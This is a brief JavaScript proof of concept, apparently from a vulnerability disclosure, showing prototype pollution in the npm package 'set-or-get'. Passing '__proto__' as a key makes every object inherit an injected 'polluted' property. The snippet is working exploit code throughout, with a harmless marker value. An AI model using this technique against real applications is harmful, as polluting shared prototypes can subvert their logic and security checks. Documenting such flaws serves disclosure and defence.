var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var SetOrGet = require('set-or-get');
obj = {};
console.log({}.polluted);
SetOrGet(obj, '__proto__', obj).polluted = 'yes';
console.log({}.polluted);